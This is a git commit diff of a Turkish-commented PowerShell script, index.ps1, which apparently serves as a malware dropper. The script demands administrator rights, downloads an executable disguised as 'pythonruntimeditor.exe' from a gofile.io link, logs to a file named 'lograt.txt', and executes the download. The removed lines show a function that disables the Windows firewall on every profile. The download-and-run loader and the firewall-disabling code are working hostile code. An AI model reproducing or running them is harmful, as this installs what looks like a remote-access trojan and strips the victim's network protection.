1133d77e63260eeef420692c9176ceff10aa4cfb
doguiaste <143461390+doguiaste@users.noreply.github.com>
2025-04-21 07:30:18 +0300

    Update index.ps1

--- index.ps1
+++ index.ps1
@@ -1,4 +1,4 @@
-# Yönetici yetkisi istemek
+# Yönetici yetkisi kontrolü ve yönetici olarak çalıştırma
 $isAdmin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
 $adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
 
@@ -8,40 +8,33 @@ if (-not ($isAdmin.IsInRole($adminRole))) {
     exit
 }
 
-# Firewall'ı kapatmak için fonksiyon
-function Disable-Firewall {
-    Write-Host "Firewall kapatılıyor..."
-    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
-    Write-Host "Firewall kapalı!"
-}
-
-# Dosya indir ve kontrol et
+# Dosya indirme URL'si
 $exeUrl = "https://store10.gofile.io/download/web/f251cd75-0191-4927-9a7b-2035446b5c3d/pythonruntimeditor.exe"
 $localPath = "C:\Users\dogud\Downloads\pythonruntimeditor.exe"
-$logFile = "C:\Users\dogud\Downloads\lograt.txt"
 
-# Log fonksiyonu
+# Log dosyasına yazılacak işlemler
+$logFile = "C:\Users\dogud\Downloads\lograt.txt"
 $log = { param($msg) Add-Content -Path $logFile -Value ("[$(Get-Date -Format 'HH:mm:ss')] $msg") }
 
 # Dosya indir ve kontrol et
 try {
     $log "İndirme işlemi başlatılıyor..."
-    Invoke-WebRequest -Uri $exeUrl -OutFile $localPath -ErrorAction Stop
+    
+    # WebClient kullanarak dosya indir
+    $client = New-Object System.Net.WebClient
+    $client.DownloadFile($exeUrl, $localPath)
 
     # Dosya boyutunu kontrol et
     $fileSize = (Get-Item $localPath).length
-    $expectedSize = 46000  # 46 KB'lik dosya için
+    $expectedSize = 46000  # 46 KB'lik dosya için beklenen boyut
 
     if ($fileSize -lt $expectedSize) {
         $log "HATA: Dosya boyutu hatalı. Boyut: $fileSize byte. Yeniden indiriyorum..."
         Remove-Item $localPath -Force
-        Invoke-WebRequest -Uri $exeUrl -OutFile $localPath -ErrorAction Stop
+        $client.DownloadFile($exeUrl, $localPath)  # Tekrar indir
     } else {
         $log "Dosya başarıyla indirildi. Boyut: $fileSize byte"
     }
-
-    # Firewall kapatılıyor
-    Disable-Firewall
 
     # Dosyayı çalıştır
     $log "Dosya çalıştırılıyor..."
